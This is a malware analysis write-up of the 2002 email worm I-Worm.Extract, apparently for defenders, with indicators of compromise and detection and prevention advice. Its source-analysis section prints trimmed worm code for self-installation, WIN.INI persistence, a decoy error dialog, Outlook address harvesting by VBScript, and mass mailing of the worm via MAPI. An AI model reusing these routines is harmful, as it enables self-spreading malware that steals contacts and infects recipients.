# Dissecting I‑Worm.Extract (2002): Dynamic KERNEL32 imports, Outlook harvesting, and Simple MAPI send 🛠️🔍

> "This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes."

## Introduction

I‑Worm.Extract is a compact Win32 email worm authored in early February 2002 in x86 assembly. It dynamically resolves core KERNEL32 APIs at runtime, installs itself into the System directory with legacy WIN.INI persistence, and leverages a dropped VBScript to harvest Outlook addresses into a local text file. Once online, it parses that file and sends messages using Simple MAPI, attaching its own binary under a benign display name. The source also includes a classic message‑box trick using the call/return address as an inline string pointer, and a small “My Documents” copy meant to appear like a Windows updater. This write‑up explains Extract’s behavior, IOCs, and salient code patterns with short, safe excerpts.

## Overview 🔍

- Platform and tooling: 32‑bit Windows; assembly with macros from `Useful.inc` and `myinclude.inc`. APIs are resolved dynamically from KERNEL32 via `GetProcAddress` into local trampolines.
- Installation and persistence:
  - Copies itself to `%System%\UpdateW32.exe` and sets legacy autorun by writing `RUN=<path>` in `%WinDir%\WIN.INI` (`WriteProfileStringA`).
  - Drops an extra copy `%Personal%\Update Windows 32bits\MAJ.exe` (social engineering).
  - If not running from the System path yet, shows a decoy “Cannot Open this File!” dialog that includes the current date.
- Discovery/harvest:
  - Creates `%WinDir%\ExtractVbs.vbs` and runs it via `wscript`. The script enumerates Outlook address lists and writes addresses into `%WinDir%\Outlook_Addr.txt` as a single semicolon‑separated line ending with the sentinel `#`. It prepends an author mailbox (`extractcounter@multimania.com`) to that list.
- Propagation:
  - Waits until `InternetGetConnectedState` reports online.
  - Maps `%WinDir%\Outlook_Addr.txt`, parses addresses delimited by `;` until `#`, and for each address calls `MAPISendMail` using a template with subject `Re: Check This...` and attachment display name `important.exe` (actual path is the worm image).
  - Logs date/time and last recipient to `C:\liste.ini` via `WritePrivateProfileStringA`.

## Section 2 – Source Code Analysis 🧩

Short, real excerpts from `extract.asm`. These are inert, trimmed, and annotated for clarity.

### 2.1 Dynamic KERNEL32 resolution (trampoline setup)

```asm
; Resolve selected KERNEL32 exports into local pointers (_ptk*)
@pushsz "KERNEL32.DLL"
api GetModuleHandleA
xchg  eax, ebx

kern macro x
  push  offset sz&x
  push  ebx
  api   GetProcAddress
  mov   _ptk&x, eax
endm

kern CreateFileA
kern GetSystemDirectoryA
kern WriteProfileStringA
; ... (many others populated similarly) ...
```

Impact: The worm avoids static imports by resolving APIs at runtime. The `_ptk*` pointers are used for all subsequent calls.

### 2.2 Install to %System%\UpdateW32.exe and WIN.INI Run

```asm
; Build %System%\UPDATEW32.EXE and copy self
push  50
push  offset verif_worm
call  _ptkGetSystemDirectoryA
@pushsz "\UPDATEW32.EXE"
push  offset verif_worm
call  _ptklstrcat

; If not already running from that path, copy and set WIN.INI run
push  esi                  ; esi = current module path
push  offset verif_worm
call  _ptklstrcmp
test  eax, eax
jz    continue_worm

push  0                    ; CopyFileA(orig -> copy)
push  edi
push  esi
call  _ptkCopyFileA

push  edi                  ; WriteProfileStringA("WINDOWS","RUN", copy)
@pushsz "RUN"
@pushsz "WINDOWS"
call  _ptkWriteProfileStringA
```

Impact: Legacy Win9x/ME‑style autorun via WIN.INI. On NT‑line systems, this persistence is less effective.

### 2.3 Inline MessageBox trick (call/return as text pointer)

```asm
; Display a decoy error with an inline text blob; the call return becomes lpText
push  10h                   ; MB_ICONHAND
push  offset date           ; caption (holds formatted date)
call  @mess
  db  "Cannot Open this File !", 13,10,13,10
  db  "If you downloaded this file, try downloading again.", 0
@mess:
  push  0                   ; hWnd = NULL
  api   MessageBoxA         ; params: (hWnd, lpText=ret, lpCaption=date, uType=0x10)
```

Impact: A common assembly trick to avoid pushing an explicit text pointer; the return address points into the embedded string.

### 2.4 VBScript harvester drop and execution

```asm
; Write %WinDir%\ExtractVbs.vbs then execute via WinExec("wscript <path>")
push  offset vbsfile
call  _ptkGetWindowsDirectoryA
@pushsz "\ExtractVbs.vbs"
call  _ptklstrcat

call  _ptkCreateFileA  ; create, then WriteFile s_vbs..e_vbs
call  _ptkWriteFile
call  _ptkCloseHandle

push  offset vbsfile
push  offset vbsexec
call  _ptklstrcpy       ; build command buffer: "wscript " + <path>
push  4
push  offset execcontrol
call  _ptkWinExec
push  5000
call  _ptkSleep
call  _ptkDeleteFileA   ; delete the VBS
```

```vbs
' ExtractVbs.vbs — harvest Outlook addresses into Outlook_Addr.txt
adr = "extractcounter@multimania.com"
For Each mail In mapi.AddressLists
  If mail.AddressEntries.Count <> 0 Then
    For O = 1 To mail.AddressEntries.Count
      adr = adr & ";" & mail.AddressEntries(O).Address
    Next
  End If
Next
adr = adr & ";#"
' Write one semicolon‑separated line into %WinDir%\Outlook_Addr.txt
```

Impact: One‑line, semicolon‑separated address list with a trailing `#` sentinel; the first entry is a hard‑coded mailbox.

### 2.5 Parse and send via Simple MAPI; log to C:\liste.ini

```asm
; Map Outlook_Addr.txt and parse addresses until '#' (end) using ';' delimiters
mov  edi, offset mail_addr
push edi
p_c: lodsb
    cmp  al, ';'       ; end of one address
    je   end_m
    cmp  al, '#'
    je   f_mail        ; stop
    cmp  al, '@'
    jne  not_a
    inc  edx           ; saw '@' in this token
not_a:
    stosb
    jmp  p_c
end_m:
    xor  al, al
    stosb              ; NUL‑terminate
    pop  edi
    test edx, edx      ; require '@'
    je   scan_mail
    call send_mail     ; MAPISendMail with Message template
    jmp  scan_mail
```

```asm
; In send_mail: log date/time/email to C:\liste.ini, then MAPISendMail
@pushsz "C:\\liste.ini"
push  offset mail_addr
push  offset time
push  offset date
call  _ptkWritePrivateProfileStringA

xor  eax, eax
push eax
push eax
push offset Message        ; subject/body, TO=mail_addr, Attach=orig_worm as "important.exe"
push eax
push [sess]                ; (likely 0; relies on default MAPI behavior)
api  MAPISendMail
```

Impact: Each semicolon‑delimited token containing an `@` is sent a message. The worm logs activity in an INI file and reuses a static attachment name label `important.exe`.

## Artifacts and IOCs

Files and directories:
- `%System%\UpdateW32.exe` (installed copy)
- `%WinDir%\ExtractVbs.vbs` (temporary harvester script)
- `%WinDir%\Outlook_Addr.txt` (one‑line, semicolon‑separated addresses ending with `#`; starts with `extractcounter@multimania.com`)
- `%Personal%\Update Windows 32bits\MAJ.exe` (copy for social engineering)
- `C:\liste.ini` (log written by `send_mail`: date/time/address)

Persistence:
- `%WinDir%\WIN.INI` modified: `[WINDOWS]` `RUN=<path-to-UpdateW32.exe>`

Email traits:
- Subject: `Re: Check This...`
- Body: bilingual EN/FR with “This is the file you ask for...” / “Voici le fichier que tu cherches...”
- Attachment label: `important.exe` (actual path = worm image)

User‑visible:
- Error‑style MessageBox with caption set to the current date and text “Cannot Open this File!...”.

## Macro and engineering notes

- `@pushsz` injects inline strings for stdcall args; `api`/`kern` macros reduce import boilerplate. The return‑address text trick (`call @label` over a DB string) is a compact UI pattern common in this codebase.
- WIN.INI persistence targets Win9x/ME and is unreliable on NT‑line without additional Run keys.
- MAPI session (`sess`) is left as 0; Simple MAPI often accepts a null session to use the default profile, but behavior depends on the client/security settings.

## Mitigation and Defense Strategies 🛡️

### Detection (Analyst focus)
- Look for WIN.INI `[WINDOWS]` `RUN=` pointing to `UpdateW32.exe`.
- File artifacts: `%WinDir%\Outlook_Addr.txt` with a single long line and trailing `#`; presence of `%WinDir%\ExtractVbs.vbs`; `C:\liste.ini` logging addresses and timestamps.
- Email indicators: bursts of Simple MAPI sends with subject `Re: Check This...` and `important.exe` attachment label; bilingual body text.
- Process behavior: `wscript` launched to run a VBS in the Windows directory; dynamic API resolution via `GetProcAddress` for many KERNEL32 routines.

### Prevention (Admin focus)
- Restrict Windows Script Host (WSH) usage and Outlook OOM/Simple MAPI automation via policy.
- Apply application allow‑listing to prevent unknown binaries from executing from `%WinDir%`/`%System%` and user profile folders.
- Email gateway controls to block executable attachments and flag double‑extension or suspicious fixed names like `important.exe`.
- Legacy hygiene: audit WIN.INI autoruns on older systems; move to modern autorun monitoring on NT‑based systems.

## Conclusion

Extract is a succinct worm that pairs dynamic API resolution with a VBS‑assisted address harvest and Simple MAPI delivery. Its reliance on WIN.INI persistence and an uninitialized MAPI session reflect its 2002 vintage, while techniques like the inline MessageBox string and a staged drop‐execute‑delete VBS are emblematic of the period. The artifacts (UpdateW32.exe, Outlook_Addr.txt with `#`, C:\liste.ini) and the mail template provide clear detection points. Standard hardening—blocking WSH/MAPI automation, allow‑listing executables, and filtering attachments—significantly reduces the impact of this family on legacy systems.